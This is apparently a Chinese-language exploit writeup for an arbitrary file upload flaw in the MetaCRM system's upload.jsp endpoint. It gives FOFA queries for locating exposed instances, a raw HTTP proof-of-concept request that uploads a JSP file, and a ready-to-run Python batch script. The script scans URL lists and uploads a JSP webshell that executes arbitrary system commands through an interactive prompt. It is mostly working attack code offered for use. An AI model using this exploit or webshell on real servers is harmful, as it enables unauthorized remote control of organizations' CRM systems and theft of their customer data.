## MetaCRM客户关系管理系统任意文件上传漏洞

MetaCRM是一款智能平台化CRM软件,通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。是建立在一种统一的架构上的技术领先的CRM系统。美特软件公司投资大量的时间与人力来开发MetaCRM，作为其旗舰产品，MetaCRM设计采用了最先进的因特网技术，因而它的架构支持统一的技术标准，融入了未来科技。建立在这种先进科技基础上的MetaCRM 5是一个技术领先的、稳定的客户关系管理解决方案。其upload.jsp接口存在任意文件上传漏洞，攻击者可通过改漏洞上传恶意脚本从而控制该系统。

## fofa
```
body="/common/scripts/basic.js"
product="美特软件-MetaCRM6"
```


## poc
```
POST /develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null& HTTP/1.1
Host: x.x.x.x
Content-Length: 779
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Referer: http://x.x.x.x/develop/systparam/softlogo/file2.jsp
Connection: close

------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="file"; filename="klms.jsp"
Content-Type: text/plain

<% out.print("HelloWorldTest");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="key"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="form"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="field"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="filetitile"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="filefolder"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh--
```

文件上传路径`http:127.0.0.1/userfile/default/userlogo/klms.jsp`

![55ae9eec40d72e700bae5a4219b36662](https://github.com/wy876/POC/assets/139549762/d6a77031-9ae1-4658-b001-9da226b79444)


## 批量脚本
```python
import requests
import urllib3
import re,string,random
from urllib.parse import urljoin
import argparse
import time
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target = urljoin(url,"/develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null&")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh"
    }
    filename = generate_random_string(6)
    data = """------WebKitFormBoundary0Mh3BfgWszxRFokh\r\nContent-Disposition: form-data; name="file"; filename="{}.jsp"\r\nContent-Type: text/plain\r\n\r\n<% out.print("HelloWorldTest");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundary0Mh3BfgWszxRFokh\r\nContent-Disposition: form-data; name="key"\r\n\r\nnull\r\n------WebKitFormBoundary0Mh3BfgWszxRFokh\r\nContent-Disposition: form-data; name="form"\r\n\r\nnull\r\n------WebKitFormBoundary0Mh3BfgWszxRFokh\r\nContent-Disposition: form-data; name="field"\r\n\r\nnull\r\n------WebKitFormBoundary0Mh3BfgWszxRFokh\r\nContent-Disposition: form-data; name="filetitile"\r\n\r\nnull\r\n------WebKitFormBoundary0Mh3BfgWszxRFokh\r\nContent-Disposition: form-data; name="filefolder"\r\n\r\nnull\r\n------WebKitFormBoundary0Mh3BfgWszxRFokh--""".format(filename)
    try:
        response = requests.post(target, verify=False, data=data,headers=headers, timeout=15)
        if response.status_code == 200 and 'userfile' in response.text and 'parentForm' in response.text:
            pattern = r'oForm\.elements\["null"\]\.value="(.*?)"'
            matches = re.findall(pattern, response.text)
            if matches:
                extracted_path = matches[0]
                result_url = urljoin(url,extracted_path)
                response = requests.get(result_url, verify=False, headers={"User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36"}, data=data, timeout=15)
                if response.status_code == 200 and 'HelloWorldTest' in response.text:
                    print(f"\033[31mDiscovered:{url}: metasoftCRM_upload_ArbitraryFileUploads!\033[0m")
                    return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = urljoin(url,"/develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null&")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh"
    }
    filename = generate_random_string(6)
    data_template = """------WebKitFormBoundary0Mh3BfgWszxRFokh\r\nContent-Disposition: form-data; name="file"; filename="replace1.jsp"\r\nContent-Type: text/plain\r\n\r\n<%@ page language="java" contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"%><%@ page import="java.io.*"%><%Process p=null;String  cmd = "replace2";String os = System.getProperty("os.name").toLowerCase();if (os.contains("windows")) {p =  Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",cmd});}else{p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});}if(cmd != null){InputStream input = p.getInputStream();InputStreamReader ins = new InputStreamReader(input, "GBK");BufferedReader br = new BufferedReader(ins);out.print("<pre>");String line;while((line = br.readLine()) != null) {out.println(line);}out.print("</pre>");br.close();ins.close();input.close();p.getOutputStream().close();}new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundary0Mh3BfgWszxRFokh\r\nContent-Disposition: form-data; name="key"\r\n\r\nnull\r\n------WebKitFormBoundary0Mh3BfgWszxRFokh\r\nContent-Disposition: form-data; name="form"\r\n\r\nnull\r\n------WebKitFormBoundary0Mh3BfgWszxRFokh\r\nContent-Disposition: form-data; name="field"\r\n\r\nnull\r\n------WebKitFormBoundary0Mh3BfgWszxRFokh\r\nContent-Disposition: form-data; name="filetitile"\r\n\r\nnull\r\n------WebKitFormBoundary0Mh3BfgWszxRFokh\r\nContent-Disposition: form-data; name="filefolder"\r\n\r\nnull\r\n------WebKitFormBoundary0Mh3BfgWszxRFokh--"""
    try:
        if check(url):
            while True:
                command = input("\033[34mPlease input command (stop input:exit):\033[0m")
                if "exit" not in command:
                    data = data_template.replace('replace1', filename).replace('replace2', command)
                    response = requests.post(target, verify=False, data=data, headers=headers, timeout=15)
                    if response.status_code == 200 and 'userfile' in response.text and 'parentForm' in response.text:
                        pattern = r'oForm\.elements\["null"\]\.value="(.*?)"'
                        matches = re.findall(pattern, response.text)
                        if matches:
                            extracted_path = matches[0]
                            result_url = urljoin(url, extracted_path)
                            response = requests.get(result_url, verify=False, headers={"User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36"}, timeout=15)
                            if response.status_code == 200:
                                print(response.text)
                else:
                    break
    except Exception as e:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")
```
